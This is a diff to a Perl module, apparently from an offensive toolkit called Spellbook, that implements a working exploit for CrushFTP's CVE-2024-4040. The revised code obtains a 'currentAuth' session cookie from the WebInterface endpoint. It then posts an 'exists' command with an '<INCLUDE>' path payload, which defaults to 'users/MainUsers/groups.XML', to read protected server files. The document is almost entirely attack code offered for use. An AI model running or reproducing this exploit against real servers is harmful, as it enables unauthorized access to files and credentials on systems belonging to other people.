@@ -3,9 +3,10 @@ package Spellbook::Advisory::CVE_2024_4040 {
     use warnings;
     use Getopt::Long;
     use Spellbook::Core::UserAgent;
+    use HTTP::Cookies;
 
     sub new {
-        my ($self, $parameters) = @_;
+        my ($class, $parameters) = @_;
         my ($target, $help, @results);
         my $payload = "users/MainUsers/groups.XML";
 
@@ -15,30 +16,28 @@ package Spellbook::Advisory::CVE_2024_4040 {
             "payload=s" => \$payload,
             "help"      => \$help
         );
-        
+    
         if ($target) {
             if ($target !~ /^http(s)?:\/\//) {
                 $target = "https://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $endpoint  = "$target/WebInterface/";
-            my $response  = $userAgent -> post($endpoint);
-            my $cookies   = $response -> headers -> header("Set-Cookie");
+            my $userAgent = Spellbook::Core::UserAgent -> new;
+
+            my $cookie_jar = HTTP::Cookies -> new;
+            $userAgent -> cookie_jar($cookie_jar);
+            my $endpoint = "$target/WebInterface/";
+            my $response = $userAgent -> post($endpoint);
+            $cookie_jar -> extract_cookies($response);
+            $cookie_jar -> save;
+            my $cookies = $response -> header("Set-Cookie");
 
             if ($cookies =~ /currentAuth=([^;]+)/) {
-                my $data = {
-                    'command' => 'exists',
-                    'paths'   => "<INCLUDE>$payload</INCLUDE>",
-                    'c2f'     => $1,
-                };
-
-                $userAgent -> post($endpoint => form => $data);
-                $response = $userAgent -> post($endpoint => form => $data);
-
-                use Data::Dumper;
-
-                push @results, $response -> content();
+                my $currentAuth = $1;
+                my $data = "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$currentAuth";
+                my $content_type = 'application/x-www-form-urlencoded';
+                $response = $userAgent -> post($endpoint, Content_Type => $content_type, Content => $data);
+                push @results, $response -> decoded_content;
             }
 
             return @results;
@@ -55,6 +54,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
 
         return 0;
     }
+
 }
 
 1;
